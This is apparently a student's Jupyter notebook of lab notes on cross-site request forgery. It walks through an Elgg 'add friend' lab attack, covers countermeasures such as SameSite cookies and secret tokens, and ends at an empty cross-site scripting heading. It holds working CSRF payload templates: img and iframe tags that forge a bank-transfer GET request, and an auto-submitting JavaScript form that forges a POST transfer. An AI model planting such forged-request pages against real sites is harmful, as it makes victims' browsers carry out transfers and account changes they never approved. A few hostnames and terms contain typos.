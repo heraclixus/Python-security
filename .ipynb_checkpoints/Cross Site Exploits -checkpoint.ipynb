{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cross Site Exploits \n",
    "\n",
    "## Cross Site Request Forgery \n",
    "This type of exploit happens on a malicious web page: when viewed by the victim, it sends a forged request to a targeted website on behalf of the victim. Since the request normally comes from a third-party web page, it is called cross-site request. <br>\n",
    "When a page from a website sends an HTTP request back to the website, it is called __same-site request__. If the request is sent to a different website, it is called __cross site request__. <br>\n",
    "If a website embeds an image from another website, then HTTP request used to fetch the image is a cross-site request. Online advertisers use cross-site requests to help display relevant advertisements to users, such that when the user visits the advertisements, they send HTTP request to the advertisement servers. \n",
    "![CSR](./image_files/CSR.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The server does not know whether the HTTP request is same-site or cross-site, this is because the browser sends all the cookies belonging to the server's domain name every time it sends HTTP request. <br>\n",
    "This introduces vulnerabilities, because whereas requests from the web's same pages are trusted, those coming from other sites cannot be trusted. Therefore, it is important for a website to know whether a request is cross-site or same-site. __Cross-Site Request Forgery (CSRF)__ is the scenario where a third-party website forges requests that are exactly the same as those in same-site requests. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### The CSRF Exploit Mechanism\n",
    "The attack scenario involves three parties: \n",
    "* the attacker's malicious site\n",
    "* the victim's browser \n",
    "* the target website for attacker to send HTTP request \n",
    "\n",
    "\n",
    "The conditions for each are:\n",
    "\n",
    "* The victim has to visit the malicious site set by attacker\n",
    "* The victim has to have an active session to the target site at the same time. (that is, logged in) \n",
    "* The Malicious site forges a cross-site HTTP request to target website."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Setup on the Ubuntu VM\n",
    "The two sites: http://www.csrflabegg/com and the site http://wwww.crsflabattacker.com have already been set up on localhost, one for target and the other for attacker."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CSRF on HTTP GET services \n",
    "HTTP GET request attach data in the URL, while POST request attach data in the body. Example of HTTP GET:\n",
    "```\n",
    "GET /post_form.php?foo=hello&bar=world HTTP/1.1 \n",
    "Host: www.example.com\n",
    "Cookie: SID=somecookies \n",
    "```\n",
    "The `foo=hello&bar=world` are parameters given to the HTTP request. <br>\n",
    "\n",
    "HTTP POST request has the format: \n",
    "```\n",
    "POST /post_form.php HTTP/1.1\n",
    "Host: www.example.com\n",
    "Cookie: SID=someothercookies\n",
    "Content-Length: 19\n",
    "foo=hello&bar=world\n",
    "```\n",
    "\n",
    "#### Example of an GET CSRF attack\n",
    "Consider online banking application at www.bank123.com that allows user to transfer money, via HTTP GET request such as:`http://www.bank123.com/transfer.php?to=3220&amount=500`. <br>\n",
    "But before the transfer, the user needs to log in, which creates an unique identification cookie for the user. Also, the HTTP GET must be a valid request. <br>\n",
    "If the attacker can get a victim to view attacker's website, they can send out a forged request from the victim's machine as a cross-site request, whereas the browser would not know it. <br> \n",
    "For GET request, the attacker can embed the following HTML in its own page: \n",
    "```\n",
    "<img src=\"http://www.bank123.com/transfer.php?to=3220&amount=500\"> \n",
    "<iframe src=\"http://www.bank123.com/transfer.php?to=3220&amount=500\"> </iframe> \n",
    "```\n",
    "The code above indicates that when the website is loaded by the browser, these tags can trigger HTTP GET requests being sent to the URLs specified in the `src` attribute.\n",
    "\n",
    "#### Attack Procedures:\n",
    "* understand how the web application works: use Firefox `LiveHTTPHeader` extension to capture the HTTP GET request. \n",
    "* example in lab is to create a new account under `Elgg` and get the parameters for 'add friend' request. \n",
    "* `__egg_ts__` and `__egg_token_` are used against the CSRF attack. \n",
    "* the attacker does not need to worry about session cookie.\n",
    "* Then, the attacker need to create a malicious webpage: \n",
    "```\n",
    "<html>\n",
    "   <body>\n",
    "       <h1> this page forges HTTP GET request </h1>\n",
    "       <img src=\"http://www.csrfllabelgg.com/action/friends/add?friend=42\" \n",
    "            alt=\"image\" width=\"1\" height=\"1\" /> \n",
    "   </body>\n",
    "</html> \n",
    "```\n",
    "the `img` tag ensures that when browser visits the page, HTTP GET request is sent automatically. The page can be hosted locally, on `www.csrflbattacker.com`, under the `/var/www/CSRF/Attacker` folder. \n",
    "* To attract the user to visit the attacker's site, the attacker could simply send the URL to the victim, or via some social engineering. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CSRF on HTTP POST request \n",
    "the same forgery request in this case can be achieved using Javascript \n",
    "The POST requests are mostly done with a form and a submit button: \n",
    "```\n",
    "<form action=\"http://www.example.com/action_post.php\" method=\"post\">\n",
    "Recipient Account: <input type=\"text\" name=\"to\" value=\"3220\"> <br> \n",
    "Account: <input type=\"text\" name=\"amount\" value=\"500\"> <br> \n",
    "<input type=\"submit value=\"submit>\n",
    "</form> \n",
    "```\n",
    "The user might not click submit, so a javascript can force a submit: \n",
    "\n",
    "```javascript\n",
    "function forge_post()\n",
    "{\n",
    "    var fields;\n",
    "    fields += \"<input type='hidden' name='to' value='3220'>\";\n",
    "    fields += \"<input type='hidden' name='amount' value='500'>\";\n",
    "    \n",
    "    var p = document.createElement(\"form\");\n",
    "    p.action = \"http://www.example.com/action_post.php\";\n",
    "    p.innerHTML = fields;\n",
    "    p.method = \"post\"; \n",
    "    document.body.appendChild(p);\n",
    "    p.submit(); \n",
    "}\n",
    "\n",
    "window.onload=function() {forge_post();}\n",
    "```\n",
    "The above code is embeded in HTML via `<script type=\"text/javascript\">` and `</script>` tags <br> \n",
    "This will automatically send POST request, with values hidden to the user. \n",
    "\n",
    "* The same procedure is applied, where attacker captures the POST HTTP header to the site \n",
    "* The attacker takes notice of the URL and parameter sessions, and look for target's parameters \n",
    "* then the modifications are only to be made in the `fields` part of the above script. \n",
    "* Samy's Worm is done in this manner on the social network app. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Countermeasures\n",
    "* the `refresher` field for HTTP header can identify cross-site request, but could leak private information of users.\n",
    "* Chrome and Opera has the same-site cookie to identify request type. `SameSite=Strict` means that cookie will not be sent along with cross-site requests; `SamSite=Lax` means that cookie will be sent along with cross-site requests if and only if they are top-level navigations.\n",
    "* Secret Tokens can be used: all the same site requests include the secret token, whereas cross-site requests do not. \n",
    "* __same origin policy__: Under the policy, a web browser permits scripts contained in a first web page to access data in a second web page, but only if both web pages have the same origin. An origin is defined as a combination of URI scheme, host name, and port number. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Elgg uses the `__elgg_ts__` and `__elgg_token__` as countermeasures, "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Cross Site Scripting Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
